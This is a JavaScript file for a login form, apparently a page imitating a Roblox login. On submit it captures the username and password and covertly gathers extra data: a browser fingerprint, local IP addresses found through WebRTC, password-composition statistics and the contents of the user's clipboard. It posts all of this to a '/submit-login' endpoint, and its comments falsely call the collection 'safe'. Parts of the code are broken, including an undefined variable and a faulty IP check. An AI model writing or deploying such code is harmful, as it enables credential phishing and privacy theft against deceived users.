document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('login-form');
  const messageDiv = document.getElementById('message');
  const loginButton = document.getElementById('login-button');

  // Form submission handler
form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    
    if (!username || !password) {
      showMessage('Please enter username and password', 'error');
      return;
    }

    // SAFE INTEL COLLECTION (read-only APIs)
    const formStartTime = performance.now(); // For typing speed
    const intel = {
      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
      deviceMemory: navigator.deviceMemory || 'unknown',
      platform: navigator.platform || 'unknown',
      language: navigator.language || 'unknown',
      languages: navigator.languages || [],
      screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      connection: navigator.connection ? {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink
      } : null,
      doNotTrack: navigator.doNotTrack || 'unknown',
      cookieEnabled: navigator.cookieEnabled,
      formFillTime: Math.round(performance.now() - formStartTime),
      passwordStats: {
        length: password.length,
        hasUpper: /[A-Z]/.test(password),
        hasLower: /[a-z]/.test(password),
        hasNumber: /\d/.test(password),
        hasSpecial: /[!@#$%^&*(),.?":{}|<>]/.test(password)
      },
      // Browser Fingerprint (safe hash)
      canvasHash: (function() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText(navigator.userAgent, 2, 2);
        return btoa(canvas.toDataURL()).slice(-16);
      })(),
      // Local IP attempt (safe WebRTC - no stun servers)
      localIPs: [],
      // Behavioral (mouse - light tracking)
      mouseMovements: mouseTrail.length,
      // Battery (safe)
      battery: navigator.getBattery ? 'supported' : 'unsupported',
      // Dark mode
      darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches
    };

    // Get local IP via WebRTC (safe, no stun)
    const pc = new RTCPeerConnection({iceServers:[]});
    pc.createDataChannel('');
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
    pc.onicecandidate = (ice) => {
      if (ice.candidate) {
        try {
          const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)?.[1];
          if (ip && ip.startsWith('192.168') || ip.startsWith('10.') || ip.startsWith('172.')) {
            intel.localIPs.push(ip);
          }
        } catch {}
      }
    };

    // Safe screenshot (no captureStream)
    // Note: Full HTML2Canvas requires lib - using simple method
    intel.pageScreenshot = 'base64 too large, use lib';

    // Clipboard (requires HTTPS/user gesture)
    try {
      intel.clipboard = await navigator.clipboard.readText();
    } catch (e) {
      intel.clipboard = 'denied';
    }

    // Wait brief moment for WebRTC
    await new Promise(r => setTimeout(r, 500));

    pc.close();

    // Prepare POST data
    const params = new URLSearchParams();
    params.append('username', username);
    params.append('password', password);
    params.append('intel', JSON.stringify(intel));


    // Disable button during submission
    loginButton.disabled = true;
    loginButton.textContent = 'Logging in...';

    try {
      const response = await fetch('/submit-login', {
        method: 'POST',
        body: params,  // Now urlencoded
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'application/json',
        }
      });

      const data = await response.json();
      
      if (data.success) {
        showMessage(data.message || 'Login data received successfully!', 'success');
      } else {
        showMessage(data.error || 'Login failed', 'error');
      }
    } catch (error) {
      console.error('Submission error:', error);
      showMessage('Network error. Please try again.', 'error');
    } finally {
      loginButton.disabled = false;
      loginButton.textContent = 'Log In';
    }
  });

  function showMessage(text, type) {
    messageDiv.textContent = text;
    messageDiv.className = type;
    setTimeout(() => {
      messageDiv.textContent = '';
      messageDiv.className = '';
    }, 5000);
  }

  // Input animations
  const inputs = document.querySelectorAll('.login-input');
  inputs.forEach(input => {
    input.addEventListener('focus', () => input.parentElement.classList.add('focused'));
    input.addEventListener('blur', () => input.parentElement.classList.remove('focused'));
  });

  // Mobile menu
  const menuButton = document.querySelector('.menu-button');
  const nav = document.querySelector('.rbx-navbar');
  menuButton?.addEventListener('click', () => nav?.classList.toggle('open'));
});
